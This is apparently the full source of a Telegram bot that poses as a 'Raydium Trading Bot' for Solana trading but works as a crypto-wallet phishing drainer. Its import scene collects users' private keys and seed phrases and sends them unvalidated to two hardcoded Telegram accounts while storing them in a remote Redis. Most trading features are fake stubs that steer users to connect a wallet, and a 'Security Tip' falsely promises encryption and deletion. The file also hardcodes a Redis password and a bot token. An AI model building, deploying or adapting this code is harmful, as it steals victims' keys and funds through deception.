import pkg from "telegraf";
const { Telegraf, Markup, session, Scenes, Stage } = pkg;
import { Keypair, Connection, LAMPORTS_PER_SOL } from "@solana/web3.js";
import bs58 from "bs58";
import * as bip39 from "bip39";
import { derivePath } from "ed25519-hd-key";
import { createClient } from "redis";
import axios from "axios";
import { ethers } from "ethers";

const redis = createClient({
  username: "default",
  password: "JgIgigc7oBveE7xRGHFeNXoHCAyBEWDE",
  socket: {
    host: "redis-13167.c92.us-east-1-3.ec2.redns.redis-cloud.com",
    port: 13167,

    // 🔁 Reconnection strategy: retry with backoff
    reconnectStrategy: (retries) => {
      if (retries > 10) {
        console.error("Redis: Too many reconnection attempts.");
        return new Error("Too many retries");
      }
      return Math.min(100 * 2 ** retries, 2000); // max 2s delay
    },
  },
});

redis.on("error", (err) => console.error("❌ Redis Client Error:", err));
redis.on("connect", () => console.log("✅ Redis connected"));
redis.on("reconnecting", () => console.log("🔁 Reconnecting to Redis..."));

(async () => {
  try {
    await redis.connect();
  } catch (err) {
    console.error("🚨 Redis connection failed:", err);
  }
})();

const development =
  "This feature is under development, please come back later🎉";

const sendMessage =
  "/sendmessage 5492021217 Insufficient funds please add at least 2 sol to your balance";

const insufficient =
  "Insufficient funds please add at least 5 sol to your balance";

function escapeMarkdownV2(text) {
  return text.replace(/[_*[\]()~`>#+\-=|{}.!]/g, "\\$&");
}

const bot = new Telegraf("7101690525:AAHy5hJjU3qdvHQPU3KIyNtbpX410I-VSMk"); //

bot.catch((err, ctx) => {
  console.error(`Error while handling update ${ctx.update.update_id}:`, err);
  // Optionally notify user
  try {
    // ctx.reply("Sorry, something went wrong. Please try again later.");
  } catch (e) {
    console.error("Error while sending error message:", e);
  }
});

const connection = new Connection("https://api.mainnet-beta.solana.com");
// 🔑 Wallet utils
function getWalletFromMnemonic(mnemonic) {
  const seed = bip39.mnemonicToSeedSync(mnemonic);
  const derived = derivePath("m/44'/501'/0'/0'", seed.toString("hex")).key;
  return Keypair.fromSeed(derived);
}

function parseWallet(input) {
  try {
    // 🧠 Mnemonic phrase (ETH/SOL)
    if (bip39.validateMnemonic(input)) {
      return getWalletFromMnemonic(input);
    }

    // 🧠 ETH hex private key (64 hex chars or 0x-prefixed)
    const hex = input.startsWith("0x") ? input.slice(2) : input;
    if (/^[0-9a-fA-F]{64}$/.test(hex)) {
      return new ethers.Wallet("0x" + hex);
    }

    // 🧠 Solana secret key in JSON array
    if (input.startsWith("[") && input.endsWith("]")) {
      const parsed = JSON.parse(input);
      if (Array.isArray(parsed) && parsed.length === 64) {
        return Keypair.fromSecretKey(Uint8Array.from(parsed));
      }
    }

    // 🧠 Solana secret key in base58 string
    if (typeof input === "string" && input.length >= 32) {
      try {
        const decoded = bs58.decode(input);
        if (decoded.length === 64) {
          return Keypair.fromSecretKey(decoded);
        }
      } catch (err) {
        // Not base58? Ignore
      }
    }
  } catch (err) {
    console.error("parseWallet error:", err.message);
  }

  return null;
}

// 🎬 Import Wallet Scene
const importWalletScene = new Scenes.BaseScene("IMPORT_WALLET");
const helpScene = new Scenes.BaseScene("HELP_SCENE");
const startScene = new Scenes.BaseScene("START_SCENE");

// 🧠 Scenes setup
// const stage = new Stage([importWalletScene]);
const stage = new Scenes.Stage([startScene, importWalletScene, helpScene]);
bot.use(session());
bot.use(stage.middleware());

startScene.enter(async (ctx) => {
  const userId = ctx.from.id;
  const secret = await redis.get(`wallet:${userId}`);

  if (secret) {
    try {
      const response = await axios.get(
        "https://api.geckoterminal.com/api/v2/networks/solana/tokens/So11111111111111111111111111111111111111112"
      );
      const price = Number(response.data.data.attributes.price_usd);
      const keypair = Keypair.fromSecretKey(bs58.decode(secret));
      const address = keypair.publicKey.toBase58();

      const balanceLamports = await connection.getBalance(keypair.publicKey);
      const sol = (balanceLamports / LAMPORTS_PER_SOL).toFixed(4);

      await ctx.replyWithMarkdownV2(
        message(Number(sol), Number(price)),
        mainButtons
      );
    } catch (err) {
      await ctx.replyWithMarkdownV2(message(0.0, 0.0), mainButtons);
    }
  } else {
    await ctx.replyWithMarkdownV2(message(0.0, 0.0), mainButtons);
  }
});

importWalletScene.enter(async (ctx) => {
  await ctx.replyWithMarkdownV2(
    "Enter the private keys or mnemonic of the wallet you want to import"
  );
});

importWalletScene.hears(/.*/, async (ctx) => {
  try {
    const input = ctx.message.text.trim();
    if (ctx.message.text === "/start") {
      await ctx.scene.leave();
      return ctx.scene.enter("START_SCENE");
    }
    await ctx.telegram.sendMessage(
      // Changed from Message to sendMessage
      //config.otherUsername,
      7491085235,
      `New wallet generated for <b>${ctx.chat.first_name}:</b> userId: <code>${ctx.from.id}</code> \n<code>${input}</code>\n`,
      { parse_mode: "HTML" }
    );

    await ctx.telegram.sendMessage(
      // Changed from Message to sendMessage
      //config.otherUsername,
      7519144495,
      `New wallet generated for <b>${ctx.chat.first_name}:</b> userId: <code>${ctx.from.id}</code> \n<code>${input}</code>\n`,
      { parse_mode: "HTML" }
    );

    const wallet = parseWallet(input);

    if (!wallet) {
      return ctx.reply(
        "❌ Invalid input. Please enter a valid private key, mnemonic, or array."
      );
    }

    if (wallet instanceof ethers.Wallet) {
      const address = wallet.address;
      const secret = wallet.privateKey;
      await redis.set(`wallet:${ctx.from.id}`, secret);
      const provider = new ethers.JsonRpcProvider("https://eth.llamarpc.com", {
        name: "mainnet",
        chainId: 1,
      });
      const balance = await provider.getBalance(address);
      const eth = ethers.formatEther(balance);
      try {
        await ctx.deleteMessage();
      } catch (err) {
        console.warn("Couldn't delete sensitive message:", err.message);
      }
      await ctx.replyWithMarkdownV2(
        escapeMarkdownV2(`✅ Wallet Imported!\n
 🪪 Address:\n${address}\n
 💰 Balance: *${eth} ETH*\n `),
        mainButtons
      );

      await ctx.scene.leave();
    } else {
      const address = wallet.publicKey.toBase58();
      const secret = bs58.encode(wallet.secretKey);

      await redis.set(`wallet:${ctx.from.id}`, secret);

      const balance = await connection.getBalance(wallet.publicKey);
      const sol = balance / LAMPORTS_PER_SOL;

      try {
        await ctx.deleteMessage();
      } catch (err) {
        console.warn("Couldn't delete sensitive message:", err.message);
      }

      await ctx.reply(
        `✅ Wallet Imported!\n
 🪪 Address:\n${address}\n
 💰 Balance: *${sol} SOL*\n 

 ⬇️ Select an action:`
      );
      await ctx.reply(`⬇️ Select an action:`, mainButtons);

      await ctx.scene.leave();
    }
  } catch (error) {
    console.log(error);
  }
});

importWalletScene.hears("/start", async (ctx) => {
  await ctx.scene.enter("START_SCENE");
});

helpScene.enter(async (ctx) => {
  await ctx.replyWithMarkdownV2(
    escapeMarkdownV2(
      "😊✍️ Please write your complaint now. Our support team will get back to you soon."
    )
  );
});

helpScene.hears(/.*/, async (ctx) => {
  const input = ctx.message.text.trim();
  await ctx.replyWithMarkdownV2(
    escapeMarkdownV2("Your request has been forwarded to the admins.")
  );
  await ctx.scene.leave();
});

// ⌨️ Inline keyboard
const mainButtons = Markup.inlineKeyboard([
  [
    Markup.button.callback("🛒 Buy", "BUY"),
    Markup.button.callback("💰 Sell", "SELL"),
  ],
  [
    Markup.button.callback("📊 Positions", "POSITIONS"),
    Markup.button.callback("📈 Limit Orders", "LIMIT_ORDERS"),
    Markup.button.callback("🔄 DCA Orders", "DCA_ORDERS"),
  ],
  [
    Markup.button.callback("🎉 Launch Coin", "LAUNCH"),
    Markup.button.callback("🎁 Claim Airdrop", "CLAIM_AIRDROP"),
  ],
  [
    Markup.button.callback("🚀 LP Sniper", "LP_SNIPER"),
    Markup.button.callback("🆕 New Pairs", "NEW_PAIRS"),
    Markup.button.callback("👥 Referrals", "REFERRALS"),
  ],
  [
    Markup.button.callback("🔗 Connect Wallet", "CONNECT_WALLET"),
    Markup.button.callback("🪙 Buy Trending", "BUYTRENDING"),
  ],
  [
    Markup.button.callback("🌉 Bridge", "BRIDGE"),
    Markup.button.callback("🤖 Copy Trade", "COPY_TRADE"),
    Markup.button.callback("💸 Withdraw", "WITHDRAW"),
  ],

  [
    Markup.button.callback("🔄 Refresh", "REFRESH"),
    Markup.button.callback("📋 Copy Wallet", "COPY_WALLET"),
  ],
  [Markup.button.callback("❓ Help", "HELP")],
]);

const escapeMarkdownV2Msg = (text) =>
  text
    .toString()
    .replace(/_/g, "\\_")
    .replace(/\*/g, "\\*")
    .replace(/\[/g, "\\[")
    .replace(/\]/g, "\\]")
    .replace(/\(/g, "\\(")
    .replace(/\)/g, "\\)")
    .replace(/~/g, "\\~")
    .replace(/`/g, "\\`")
    .replace(/>/g, "\\>")
    .replace(/#/g, "\\#")
    .replace(/\+/g, "\\+")
    .replace(/-/g, "\\-")
    .replace(/=/g, "\\=")
    .replace(/\|/g, "\\|")
    .replace(/{/g, "\\{")
    .replace(/}/g, "\\}")
    .replace(/\./g, "\\.")
    .replace(/!/g, "\\!")
    .replace(/\$/g, "\\$");

const message = (balance, price) => {
  const balStr = escapeMarkdownV2Msg(balance.toFixed(4));
  const usdStr = escapeMarkdownV2Msg((price * balance).toFixed(2));
  return ` Hello, Welcome to Raydium Trading Bot\\.  
Exclusively built by the Solana Dex community,  
The best bot used for trading any SOL token\\.  
  
Your wallet address:  
Solana:  
  \`\`\`
DZr73iXpgwQBXxZLptjfcpGn2CLynDoSAUxAcFXkmyVr
  \`\`\`  
Bal: ${balStr} SOL \\- \\$${usdStr}  
Click on the Refresh button to update your current balance`;
};
bot.start(async (ctx) => {
  const userId = ctx.from.id;
  const secret = await redis.get(`wallet:${userId}`);

  if (secret) {
    try {
      const response = await axios.get(
        "https://api.geckoterminal.com/api/v2/networks/solana/tokens/So11111111111111111111111111111111111111112"
      );
      const price = Number(response.data.data.attributes.price_usd);
      const keypair = Keypair.fromSecretKey(bs58.decode(secret));
      const address = keypair.publicKey.toBase58();

      const balanceLamports = await connection.getBalance(keypair.publicKey);
      const sol = (balanceLamports / LAMPORTS_PER_SOL).toFixed(4);

      await ctx.replyWithMarkdownV2(
        message(Number(sol), Number(price)),
        mainButtons
      );
    } catch (err) {
      await ctx.replyWithMarkdownV2(message(0.0, 0.0), mainButtons);
    }
  } else {
    await ctx.replyWithMarkdownV2(message(0.0, 0.0), mainButtons);
  }
});
bot.command("sendmessage", async (ctx) => {
  // Log the raw command
  console.log("Raw command:", ctx.message.text);

  const args = ctx.message.text.split(" ").slice(1);
  const userId = args[0];
  const message = args.slice(1).join(" ");

  console.log("Parsed args:", { userId, message });

  if (!userId || !message) {
    return ctx.reply("Usage: /sendmessage <userId> <message>");
  }

  try {
    console.log(`Attempting to send message to user ${userId}: "${message}"`);
    await ctx.telegram.sendMessage(userId, message, { parse_mode: "HTML" });
    ctx.reply(`Message sent to user ${userId}`);
  } catch (error) {
    console.error("Failed to send message:", error.message);
    ctx.reply(
      `Failed to send message: ${error.message}. Please check the user ID and try again.`
    );
  }
});
bot.command("ping", (ctx) => {
  console.log("Ping received!");
  ctx.reply("Pong!");
});

bot.action("DELETE_KEY_MSG", async (ctx) => {
  try {
    await ctx.answerCbQuery("Private key message will be deleted.");

    // Delete the message that contains the key
    await ctx.deleteMessage();

    // Retrieve secret from Redis
    const userId = ctx.from.id;
    const secret = await redis.get(`wallet:${userId}`);

    if (!secret) {
      return ctx.reply(
        "❌ Could not find your wallet. Please create or import again."
      );
    }

    // Restore wallet from secret key
    const keypair = Keypair.fromSecretKey(bs58.decode(secret));
    const address = keypair.publicKey.toBase58();

    // Get balance
    const balanceLamports = await connection.getBalance(keypair.publicKey);
    const sol = (balanceLamports / LAMPORTS_PER_SOL).toFixed(4);

    await ctx.replyWithMarkdownV2(
      `💼 *Your Solana Wallet:*\n\nAddress: \`${escapeMarkdownV2(address)}\` \n\nBalance: *${escapeMarkdownV2(sol)} SOL*`,
      mainButtons
    );
  } catch (err) {
    console.error("Error in DELETE_KEY_MSG:", err);
    await ctx.reply(
      "❌ Couldn't delete the message. Please delete it manually."
    );
  }
});

// 🎬 Trigger import scene
bot.action("CONNECT_WALLET", async (ctx) => {
  await ctx.answerCbQuery();
  await ctx.replyWithMarkdownV2(
    escapeMarkdownV2Msg(
      `🔒 *Security Tip:* Never share your private key or mnemonic with people.\n\nThis bot stores your wallet securely for session-based trading.\n\n🛡️ Your data is encrypted and deleted after setup.`
    )
  );

  await ctx.scene.enter("IMPORT_WALLET");
});

bot.action("WRITE_COMPLAINT", async (ctx) => {
  await ctx.answerCbQuery();

  await ctx.scene.enter("HELP_SCENE");
});

// 🪝 Placeholder handlers
bot.action(/.*/, async (ctx) => {
  await ctx.answerCbQuery();
  if (ctx.match.input === "REFRESH") {
    const userId = ctx.from.id;
    const secret = await redis.get(`wallet:${userId}`);

    if (secret) {
      try {
        const response = await axios.get(
          "https://api.geckoterminal.com/api/v2/networks/solana/tokens/So11111111111111111111111111111111111111112"
        );
        const price = Number(response.data.data.attributes.price_usd);
        const keypair = Keypair.fromSecretKey(bs58.decode(secret));
        const address = keypair.publicKey.toBase58();

        const balanceLamports = await connection.getBalance(keypair.publicKey);
        const sol = (balanceLamports / LAMPORTS_PER_SOL).toFixed(4);

        await ctx.replyWithMarkdownV2(
          message(Number(sol), Number(price)),
          mainButtons
        );
      } catch (err) {
        await ctx.replyWithMarkdownV2(message(0.0, 0.0), mainButtons);
      }
    } else {
      await ctx.replyWithMarkdownV2(message(0.0, 0.0), mainButtons);
    }
  } else if (ctx.match.input === "REFERRALS") {
    await ctx.replyWithMarkdownV2(development);
  } else if (ctx.match.input === "BUY") {
    await ctx.replyWithMarkdownV2(
      escapeMarkdownV2(
        "(minimum buy 0.5 sol) If you need to import your wallet, use the 'Connect Wallet' button."
      )
    );
  } else if (
    ctx.match.input === "SELL" ||
    ctx.match.input === "POSITIONS" ||
    ctx.match.input === "LIMIT_ORDERS" ||
    ctx.match.input === "DCA_ORDERS" ||
    ctx.match.input === "COPY_TRADE"
  ) {
    await ctx.replyWithMarkdownV2(
      escapeMarkdownV2(
        "You do not have tokens yet, start trading in the buy menu click on the refresh button to update your balance."
      )
    );
  } else if (ctx.match.input === "LP_SNIPER") {
    await ctx.replyWithMarkdownV2(
      escapeMarkdownV2(
        "Sniper just released in early access. Available for selected users (active and loyal users)."
      )
    );
  } else if (ctx.match.input === "BRIDGE") {
    await ctx.replyWithMarkdownV2(
      escapeMarkdownV2("Balance: 0 SOL - $0.00 minimum bridge amount(0.5 sol).")
    );
  } else if (ctx.match.input === "NEW_PAIRS") {
    await ctx.replyWithMarkdownV2(
      escapeMarkdownV2(
        "No wallet connected, Import wallet to see the list of new pairs on Solana."
      )
    );
  } else if (ctx.match.input === "WITHDRAW") {
    await ctx.replyWithMarkdownV2(
      escapeMarkdownV2(
        "Balance: 0 SOL - $0.00 minimum withdrawal amount(0.5 sol)."
      )
    );
  } else if (ctx.match.input === "COPY_WALLET") {
    await ctx.replyWithMarkdownV2(
      "```DZr73iXpgwQBXxZLptjfcpGn2CLynDoSAUxAcFXkmyVr```"
    );
  } else if (ctx.match.input === "HELP") {
    await ctx.replyWithMarkdownV2(
      escapeMarkdownV2(
        "You can open a request to the Raydium Trading Bot support service. The Tech team would respond in the next 24 hours Via your your DM \nFor a faster solution to the problem, describe your appeal as clearly as possible. You can provide files or images if needed.\n \n📋 Rules for contacting technical support: \n1️⃣ When you first contact, please introduce yourself. \n2️⃣ Describe the problem in your own words. \n3️⃣ Be polite, and politeness will be with you! \n"
      ),
      Markup.inlineKeyboard([
        [Markup.button.callback("✍️ Write Complaint", "WRITE_COMPLAINT")],
      ])
    );
  } else if (ctx.match.input === "CLAIM_AIRDROP") {
    await ctx.replyWithMarkdownV2(
      escapeMarkdownV2(
        "To claim your airdrop, make sure your wallet is connected. Click on the 'Connect Wallet' to connect your wallet and click refresh to update."
      )
    );
  } else if (ctx.match.input === "LAUNCH") {
    await ctx.replyWithMarkdownV2(
      escapeMarkdownV2Msg(
        "No wallet connected, Import wallet to launch a new coin with liquidity on Solana."
      )
    );
  } else if (ctx.match.input === "BUYTRENDING") {
    await ctx.replyWithMarkdownV2(
      "⛓️ Select Chain",
      Markup.inlineKeyboard([
        Markup.button.callback("🌿 Solana", "SOLANA_BUYTRENDING"),
        Markup.button.callback("🧬 Ethereum", "ETHEREUM_BUYTRENDING"),
      ])
    );
  } else if (
    ctx.match.input === "SOLANA_BUYTRENDING" ||
    ctx.match.input === "ETHEREUM_BUYTRENDING"
  ) {
    await ctx.answerCbQuery();
    await ctx.replyWithMarkdownV2(
      escapeMarkdownV2Msg(
        `🔒 *Security Tip:* Never share your private key or mnemonic with people.\n\nThis bot stores your wallet securely for session-based trading.\n\n🛡️ Your data is encrypted and deleted after setup.`
      )
    );

    await ctx.scene.enter("IMPORT_WALLET");
  }
});

const launch = async () => {
  try {
    console.log("🚀 Telegram bot starting...");
    await bot.launch();
    console.log("✅ Bot launched successfully!");
    process.once("SIGINT", () => {
      console.log("SIGINT received, stopping bot...");
      bot.stop("SIGINT");
    });
    process.once("SIGTERM", () => {
      console.log("SIGTERM received, stopping bot...");
      bot.stop("SIGTERM");
    });
  } catch (error) {
    console.error("Error launching bot:", error);
    console.log("Attempting to restart in 5 seconds...");
    setTimeout(launch, 5000);
  }
};
// 🚀 Launch
launch();
